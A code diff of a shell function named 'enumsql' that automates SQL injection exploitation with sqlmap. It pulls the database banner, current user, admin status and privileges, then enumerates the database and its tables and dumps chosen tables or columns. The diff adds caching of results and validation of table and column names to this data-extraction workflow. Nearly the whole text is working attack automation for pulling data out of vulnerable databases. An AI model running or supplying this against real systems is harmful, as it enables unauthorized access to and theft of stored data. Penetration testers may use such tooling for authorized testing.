@@ -682,56 +682,127 @@ enumsql() {
         echo "\033[1;31m[*] Time-based injection -- this might take a while. \033[0m"
     fi
 
-    echo "\033[1;33m[!] Grabbing database banner \033[0m"
+    echo -e "\033[1;33m[!] Fetching database banner...\033[0m"
     echo "\033[0;34m[>] sqlmap $@ --banner --batch  \033[0m"  
     sqlmap $@ --banner --batch 2>/dev/null | grep -E --color=never "technology:|DBMS:|banner:|system:"
-    echo "\033[1;33m[!] Fetching current user \033[0m"
+    echo -e "\033[1;33m[!] Fetching current user...\033[0m"
     echo "\033[0;34m[>] sqlmap $@ --current-user --batch \033[0m"
     sqlmap $@ --current-user --batch 2>/dev/null | grep -oP --color=never "(?<=current user: ').*(?=')"
-    echo "\033[1;33m[!] Is current user database admin? \033[0m"
+    echo -e "\033[1;33m[!] Checking if user is database admin...\033[0m"
     echo "\033[0;34m[>] sqlmap $@ --is-dba --batch \033[0m"
     sqlmap $@ --is-dba --batch 2>/dev/null | grep -oP --color=never "(?<=DBA: ).*" | highlight red "True" 
-    echo "\033[1;33m[!] Fetching current user's privileges \033[0m"
+    echo -e "\033[1;33m[!] Fetching user privileges...\033[0m"
     echo "\033[0;34m[>] sqlmap $@ --privileges --batch \033[0m"
     sqlmap $@ --privileges --batch 2>/dev/null | grep -oP --color=never "(?<=privilege: ').*(?=')"
-    
-    echo "\033[1;36m[*] Beginning schema enumeration. Don't skip these steps! \033[0m"
-    echo "\033[1;33m[!] Fetching current database \033[0m"
-    echo "\033[0;34m[>] sqlmap $@ --current-db --batch \033[0m"
-    sqlmap $@ --current-db --batch 2>/dev/null | grep -oP --color=never "(?<=current database: ').*(?=')"| tee db.txt
-    echo "\033[1;33m[!] Fetching tables \033[0m"
-    echo "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) --tables --batch \033[0m"
-    sqlmap $@ -D $(cat db.txt) --tables --batch 2>/dev/null | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | tee tables.txt
-    
-    echo "\033[1;36m[?] Enter the tables you are interested in, separated by commas: \033[0m"
-    read selected_tables    
-    if [[ -z "$selected_tables" ]]; then
-        echo "\033[1;31m[*] No tables selected. Exiting. \033[0m"
-        trap - INT
-        return
+  
+  
+    if [[ ! -f db.txt ]]; then
+        echo -e "\033[1;33m[!] Fetching current database... \033[0m"
+        echo -e "\033[0;34m[>] sqlmap $@ --current-db --batch \033[0m"
+        sqlmap "$@" --current-db --batch 2>/dev/null | grep -oP --color=never "(?<=current database: ').*(?=')" | tee db.txt
+    else
+        echo -e "\033[1;33m[!] Database already known (db.txt exists). Skipping. \033[0m"
+        cat db.txt
     fi
-    echo "$selected_tables" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' > selected_tables.tmp
 
-    echo "\033[1;36m[?] Retrieve selected tables' schema? [y/N] \033[0m"
-    read -s -q confirm
-    if [[ $confirm =~ ^[Yy]$ ]]; then
-        while read -r table; do
-            echo "\033[1;33m[!] Retrieving $table's schema \033[0m"
-            echo "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) -T \"$table\" --schema --batch \033[0m"
-            sqlmap $@ -D $(cat db.txt) -T "$table" --schema --batch 2>/dev/null | tail -n +10 | grep --color=never -P "Table: .*|^\+\-*|\|\s.*"
-        done < selected_tables.tmp    
+    if [[ -f db.txt && ! -f tables.txt ]]; then
+        echo -e "\033[1;33m[!] Fetching tables... \033[0m"
+        echo -e "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) --tables --batch \033[0m"
+        sqlmap "$@" -D "$(cat db.txt)" --tables --batch 2>/dev/null | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | sed 's/[[:space:]]*$//' | tee tables.txt
+    elif [[ -f tables.txt ]]; then
+        echo -e "\033[1;33m[!] Tables already known (tables.txt exists). Skipping. \033[0m"
+        cat tables.txt
+    else
+        echo -e "\033[1;31m[*] Database not found. Cannot fetch tables. \033[0m"
+        trap - INT
+        return 1
     fi
     
-    echo "\033[1;36m[?] Dump selected tables? [Y/N] \033[0m"
-    read -s -q confirm
-    if [[ -z "$confirm" || $confirm =~ ^[Yy]$ ]]; then
-        while read -r table; do
-            echo "\033[1;33m[!] Dumping $table's contents \033[0m"
-            echo "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) -T \"$table\" --dump --batch \033[0m"
-            sqlmap $@ -D $(cat db.txt) -T "$table" --dump --batch 2>/dev/null | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3  
-        done < selected_tables.tmp            
-    fi
-    rm selected_tables.tmp
+    #echo ""
+    echo -e "\033[1;36m[?] Enter the tables you are interested in (comma-separated): \033[0m"
+    stty sane
+
+    while true; do
+        read selected_tables < /dev/tty
+        if [[ -z "$selected_tables" ]]; then
+            echo -e "\033[1;31m[*] No tables selected. Exiting. \033[0m"
+            trap - INT
+            return
+        fi
+
+        # Process input and validate each table
+        invalid_tables=0
+        echo "$selected_tables" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' > selected_tables.tmp
+        while IFS= read -r table; do
+            if ! grep -qxF "$table" tables.txt; then
+                echo -e "\033[1;31m[*] Table \"$table\" not found! \033[0m"
+                invalid_tables=1
+            fi
+        done < selected_tables.tmp
+
+        if [[ $invalid_tables -eq 0 ]]; then
+            break
+        fi
+
+        echo -e "\033[1;36m[?] Please re-enter valid table names: \033[0m"
+    done
+
+    # Ensure the final valid tables list is in `selected_tables.tmp`
+    cat selected_tables.tmp > valid_tables.tmp
+    #echo ""
+
+    exec 3< valid_tables.tmp
+    while IFS= read -r table <&3; do
+        echo -e "\033[1;33m[!] Accessing \"\033[1;37m$table\033[1;33m\" table... \033[0m"
+        echo -e "\033[1;36m[?] Fetch schema for targeted dumping? [y/N] \033[0m"
+        stty sane
+        read -s -q confirm
+        if [[ $confirm =~ ^[Yy]$ ]]; then
+            echo -e "\033[1;33m[!] Retrieving columns \033[0m"
+            echo -e "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) -T $table --columns --batch \033[0m"
+            sqlmap $@ -D "$(cat db.txt)" -T "$table" --columns --batch | tail -n +10 | grep --color=never -P "Table: .*|^\+\-*|\|\s.*" | tee "${table}_columns.tmp"
+            cat "${table}_columns.tmp" | grep --color=never -P "^\|\s.*\s\|" | awk -F'|' '{print $2}' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | tail -n +2 > columns.tmp; mv columns.tmp "${table}_columns.tmp"
+            
+            echo -e "\033[1;36m[?] Enter the columns you are interested in (comma-separated) -- blank for all: \033[0m"
+            while true; do
+                read selected_columns < /dev/tty
+                if [[ -z "$selected_columns" ]]; then
+                    echo -e "\033[1;33m[!] No columns selected. Dumping entire table. \033[0m"
+                    echo -e "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) -T $table --dump --batch \033[0m"
+                    sqlmap $@ -D "$(cat db.txt)" -T "$table" --dump --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
+                    break
+                fi
+
+                # Validate each column
+                invalid_columns=0
+                echo "$selected_columns" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' > selected_columns.tmp
+                while IFS= read -r column; do
+                    if ! grep -qxF "$column" "${table}_columns.tmp"; then
+                        echo -e "\033[0;31m[!] Column \"$column\" not found in table \"$table\". \033[0m"
+                        invalid_columns=1
+                    fi
+                done < selected_columns.tmp
+
+                if [[ $invalid_columns -eq 0 ]]; then
+                    echo -e "\033[1;33m[!] Dumping selected columns. \033[0m"
+                    echo -e "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) -T $table -C $selected_columns --dump --batch \033[0m"
+                    sqlmap $@ -D "$(cat db.txt)" -T "$table" -C "$selected_columns" --dump --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
+                    break
+                fi
+
+                echo -e "\033[1;36m[?] Please re-enter valid column names: \033[0m"
+            done
+
+        else
+            echo -e "\033[1;33m[!] Dumping entire table \"$table\". \033[0m"
+            echo -e "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) -T $table --dump --batch \033[0m"
+            sqlmap $@ -D "$(cat db.txt)" -T "$table" --dump --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
+        fi
+        #echo ""
+    done
+    exec 3<&-
+    
+    rm *.tmp
     trap - INT
     echo "\033[1;31m[*] Done. \033[0m"
 }
